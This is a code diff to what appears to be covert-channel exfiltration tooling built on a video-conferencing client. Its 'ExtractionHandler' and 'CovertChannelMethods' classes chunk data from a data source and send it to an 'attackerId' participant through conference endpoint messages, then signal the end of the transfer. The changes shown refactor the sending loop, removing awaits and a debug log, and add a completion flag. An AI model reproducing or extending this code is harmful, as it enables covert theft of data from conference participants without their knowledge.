@@ -26,7 +26,7 @@ class CovertChannelMethods {
      * Sending data using simple plain method
      * @param {any} data - specified data to be sent
      */
-    static async usePlain(data, attackerId) {
+    static usePlain(data, attackerId) {
         APP.conference.sendEndpointMessage(attackerId, {
             extraction: 'reply',
             payload: data
@@ -117,6 +117,7 @@ export class ExtractionHandler {
         this.configuration = getDefaultSettings(defaultConfigurationValues, configuration);
         this.dataSource = dataSource;
         this._fileBuffer = [];
+        this.communicationEnded = false;
     }
 
     /**
@@ -137,17 +138,17 @@ export class ExtractionHandler {
     async sendAll(data, attackerId, dataSize = data.length) {
         // If the method can loose data through the transition send the final size of sent file.
         if (this.configuration.method !== 'plain') {
-            await CovertChannelMethods.options[this.configuration.method](dataSize, attackerId);
+            CovertChannelMethods.options[this.configuration.method](dataSize, attackerId);
         }
         for (const chunkData of splitString(data, this.configuration.chunkSize)) {
             // send data using corresponding method
-            console.log('DATA:', chunkData);
-            await CovertChannelMethods.options[this.configuration.method](chunkData, attackerId);
+            CovertChannelMethods.options[this.configuration.method](chunkData, attackerId);
         }
         APP.conference.sendEndpointMessage(attackerId, {
             extraction: 'reply',
             isEnd: true
         });
+        this.communicationEnded = true;
     }
 
     /**
@@ -170,6 +171,7 @@ export class ExtractionHandler {
                 }));
             }
             this._fileBuffer = []; // empty the file buffer after ending communication.
+            this.communicationEnded = true;
 
         } else { // 'reply' containg text data
             this._fileBuffer.push(recievedData.payload);
